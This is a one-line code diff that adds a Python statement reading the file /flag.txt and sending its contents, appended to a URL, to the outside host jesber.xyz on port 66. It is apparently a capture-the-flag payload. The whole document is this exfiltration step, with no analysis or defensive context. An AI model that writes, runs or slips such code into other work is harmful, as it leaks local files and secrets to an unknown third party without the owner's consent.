@@ -1,0 +1,1 @@
+URL = "http://jesber.xyz:66/"; URL += open("/flag.txt", "r").read(); __import__("requests").get(url = URL)
